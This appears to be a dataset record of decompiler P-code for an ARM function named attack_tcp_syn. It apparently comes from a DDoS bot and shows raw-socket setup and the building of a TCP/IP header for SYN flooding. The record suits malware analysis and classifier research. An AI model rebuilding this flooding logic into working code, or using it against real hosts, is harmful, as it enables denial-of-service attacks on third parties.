Label: 855
Function: attack_tcp_syn
Architecture: arm
Source File: Unknown
Entry Point: 00016c98

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x100002bf, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x3d, 4)
(stack, 0xffffffffffffffd2, 1) INDIRECT (stack, 0xffffffffffffffd2, 1) , (const, 0x23a, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x23a, 4)
(stack, 0xffffffffffffffd4, 1) INDIRECT (stack, 0xffffffffffffffd4, 1) , (const, 0x23a, 4)
(stack, 0xffffffffffffffd5, 1) INDIRECT (stack, 0xffffffffffffffd5, 1) , (const, 0x23a, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x23a, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x23a, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x23a, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x23a, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x23a, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x23a, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x23a, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x23a, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x23a, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x23a, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x23a, 4)
(register, 0x65, 1) INT_NOTEQUAL (register, 0x20, 4) , (const, 0xffffffff, 4)
 ---  CBRANCH (ram, 0x175c8, 1) , (register, 0x65, 1)
(stack, 0xffffffffffffffac, 4) COPY (const, 0x1, 4)
(register, 0x2c, 4) PTRSUB (register, 0x54, 4) , (const, 0xffffffac, 4)
(register, 0x20, 4) CALL (ram, 0x2bb70, 8) , (register, 0x20, 4) , (const, 0x0, 4) , (const, 0x3, 4) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x293, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x293, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x293, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x293, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x293, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x293, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (register, 0x20, 4) , (const, 0x293, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x293, 4)
(stack, 0xffffffffffffffd2, 1) INDIRECT (stack, 0xffffffffffffffd2, 1) , (const, 0x293, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x293, 4)
(stack, 0xffffffffffffffd4, 1) INDIRECT (stack, 0xffffffffffffffd4, 1) , (const, 0x293, 4)
(stack, 0xffffffffffffffd5, 1) INDIRECT (stack, 0xffffffffffffffd5, 1) , (const, 0x293, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x293, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x293, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x293, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x293, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x293, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x293, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x293, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x293, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x293, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x293, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x293, 4)
(register, 0x65, 1) INT_NOTEQUAL (register, 0x20, 4) , (const, 0xffffffff, 4)
 ---  CBRANCH (ram, 0x16ed4, 1) , (register, 0x65, 1)
 ---  CALL (ram, 0x2991c, 8) , (stack, 0xffffffffffffffc8, 4)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x2aa, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffd2, 1) INDIRECT (stack, 0xffffffffffffffd2, 1) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffd4, 1) INDIRECT (stack, 0xffffffffffffffd4, 1) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffd5, 1) INDIRECT (stack, 0xffffffffffffffd5, 1) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x2aa, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x2aa, 4)
 ---  BRANCH (ram, 0x175cc, 1)
(stack, 0xffffffffffffffac, 4) COPY (const, 0x0, 4)
 ---  BRANCH (ram, 0x172dc, 1)
(register, 0x30, 4) PTRADD (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffac, 4) , (const, 0x4, 4)
(unique, 0x100002c7, 4) CALL (ram, 0x26a60, 8) , (const, 0x80, 4) , (const, 0x1, 4)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x60a, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x60a, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x60a, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x60a, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x60a, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x60a, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x60a, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x60a, 4)
(stack, 0xffffffffffffffd2, 1) INDIRECT (stack, 0xffffffffffffffd2, 1) , (const, 0x60a, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x60a, 4)
(stack, 0xffffffffffffffd4, 1) INDIRECT (stack, 0xffffffffffffffd4, 1) , (const, 0x60a, 4)
(stack, 0xffffffffffffffd5, 1) INDIRECT (stack, 0xffffffffffffffd5, 1) , (const, 0x60a, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x60a, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x60a, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x60a, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x60a, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x60a, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x60a, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x60a, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x60a, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x60a, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x60a, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x60a, 4)
(register, 0x20, 4) CAST (unique, 0x100002c7, 4)
 ---  STORE (const, 0x1a1, 4) , (register, 0x30, 4) , (register, 0x20, 4)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x60d, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x60d, 4)
(register, 0x2c, 4) PTRADD (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffac, 4) , (const, 0x4, 4)
(unique, 0x100002cb, 4) LOAD (const, 0x1a1, 4) , (register, 0x2c, 4)
(register, 0x2c, 4) CAST (unique, 0x100002cb, 4)
(unique, 0x100002cf, 4) PTRADD (register, 0x2c, 4) , (const, 0x1, 4) , (const, 0x14, 4)
(register, 0x2c, 4) CAST (unique, 0x100002cf, 4)
(unique, 0x100002d3, 4) PTRADD (register, 0x2c, 4) , (const, 0x2, 4) , (const, 0x14, 4)
(register, 0x2c, 4) CAST (unique, 0x100002d3, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x100002d7, 4)
(unique, 0x100002d7, 4) CAST (register, 0x2c, 4)
(register, 0x2c, 1) INT_AND (unique, 0x43980, 1) , (const, 0x4f, 1)
(register, 0x2c, 1) INT_OR (register, 0x2c, 1) , (const, 0x40, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x100002db, 4) , (register, 0x2c, 1)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x666, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x666, 4)
(unique, 0x100002db, 4) CAST (register, 0x2c, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x100002df, 4)
(unique, 0x100002df, 4) CAST (register, 0x2c, 4)
(register, 0x2c, 1) INT_AND (unique, 0x43980, 1) , (const, 0xf5, 1)
(register, 0x2c, 1) INT_OR (register, 0x2c, 1) , (const, 0x5, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x100002e3, 4) , (register, 0x2c, 1)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x687, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x687, 4)
(unique, 0x100002e3, 4) CAST (register, 0x2c, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (stack, 0xffffffffffffffeb, 1)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x68f, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x68f, 4)
(unique, 0x8280, 4) PTRSUB (register, 0x2c, 4) , (const, 0x1, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (const, 0x3c, 2)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x69d, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x69d, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x69d, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (register, 0x2c, 4) , (const, 0x69d, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (register, 0x2c, 4) , (const, 0x69d, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (register, 0x2c, 4) , (const, 0x69d, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x69d, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x69d, 4)
(stack, 0xffffffffffffffd2, 1) INDIRECT (stack, 0xffffffffffffffd2, 1) , (const, 0x69d, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x69d, 4)
(stack, 0xffffffffffffffd4, 1) INDIRECT (stack, 0xffffffffffffffd4, 1) , (const, 0x69d, 4)
(stack, 0xffffffffffffffd5, 1) INDIRECT (stack, 0xffffffffffffffd5, 1) , (const, 0x69d, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x69d, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x69d, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x69d, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x69d, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x69d, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x69d, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x69d, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x69d, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x69d, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x69d, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x69d, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x6a4, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x6a4, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb8, 4) , (const, 0x2, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffe8, 2)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x6aa, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffd2, 1) INDIRECT (stack, 0xffffffffffffffd2, 1) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffd4, 1) INDIRECT (stack, 0xffffffffffffffd4, 1) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffd5, 1) INDIRECT (stack, 0xffffffffffffffd5, 1) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x6aa, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x6aa, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x6b1, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x6b1, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb8, 4) , (const, 0x4, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (stack, 0xffffffffffffffe7, 1)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x6b9, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x6b9, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb8, 4) , (const, 0x8, 4)
(register, 0x65, 1) INT_NOTEQUAL (stack, 0xffffffffffffffe6, 1) , (const, 0x0, 1)
 ---  CBRANCH (ram, 0x16fcc, 1) , (register, 0x65, 1)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (const, 0x4000, 2)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x6db, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffd2, 1) INDIRECT (stack, 0xffffffffffffffd2, 1) , (const, 0x6db, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x6db, 4)
(stack, 0xffffffffffffffd4, 1) INDIRECT (stack, 0xffffffffffffffd4, 1) , (const, 0x6db, 4)
(stack, 0xffffffffffffffd5, 1) INDIRECT (stack, 0xffffffffffffffd5, 1) , (const, 0x6db, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x6db, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x6db, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x6db, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x6db, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x6db, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x6db, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x6db, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x6db, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x6db, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x6e2, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x6e2, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb8, 4) , (const, 0x6, 4)
(ram, 0x175d4, 4) MULTIEQUAL (ram, 0x175d4, 4) , (ram, 0x175d4, 4)
(ram, 0x175d8, 4) MULTIEQUAL (ram, 0x175d8, 4) , (ram, 0x175d8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffb0, 4) MULTIEQUAL (stack, 0xffffffffffffffb0, 4) , (stack, 0xffffffffffffffb0, 4)
(stack, 0xffffffffffffffb4, 4) MULTIEQUAL (stack, 0xffffffffffffffb4, 4) , (stack, 0xffffffffffffffb4, 4)
(stack, 0xffffffffffffffb8, 4) MULTIEQUAL (stack, 0xffffffffffffffb8, 4) , (stack, 0xffffffffffffffb8, 4)
(stack, 0xffffffffffffffc8, 4) MULTIEQUAL (stack, 0xffffffffffffffc8, 4) , (stack, 0xffffffffffffffc8, 4)
(stack, 0xffffffffffffffcc, 4) MULTIEQUAL (stack, 0xffffffffffffffcc, 4) , (stack, 0xffffffffffffffcc, 4)
(stack, 0xffffffffffffffd2, 1) MULTIEQUAL (stack, 0xffffffffffffffd2, 1) , (stack, 0xffffffffffffffd2, 1)
(stack, 0xffffffffffffffd3, 1) MULTIEQUAL (stack, 0xffffffffffffffd3, 1) , (stack, 0xffffffffffffffd3, 1)
(stack, 0xffffffffffffffd4, 1) MULTIEQUAL (stack, 0xffffffffffffffd4, 1) , (stack, 0xffffffffffffffd4, 1)
(stack, 0xffffffffffffffd5, 1) MULTIEQUAL (stack, 0xffffffffffffffd5, 1) , (stack, 0xffffffffffffffd5, 1)
(stack, 0xffffffffffffffd6, 1) MULTIEQUAL (stack, 0xffffffffffffffd6, 1) , (stack, 0xffffffffffffffd6, 1)
(stack, 0xffffffffffffffd7, 1) MULTIEQUAL (stack, 0xffffffffffffffd7, 1) , (stack, 0xffffffffffffffd7, 1)
(stack, 0xffffffffffffffd8, 4) MULTIEQUAL (stack, 0xffffffffffffffd8, 4) , (stack, 0xffffffffffffffd8, 4)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe2, 2) MULTIEQUAL (stack, 0xffffffffffffffe2, 2) , (stack, 0xffffffffffffffe2, 2)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe6, 1) MULTIEQUAL (stack, 0xffffffffffffffe6, 1) , (stack, 0xffffffffffffffe6, 1)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 2) MULTIEQUAL (stack, 0xffffffffffffffe8, 2) , (stack, 0xffffffffffffffe8, 2)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (const, 0x6, 1)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x6f3, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x6f3, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb8, 4) , (const, 0x9, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x100001ba, 4) , (stack, 0xffffffffffffffcc, 4)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x6f9, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x6f9, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb8, 4) , (const, 0xc, 4)
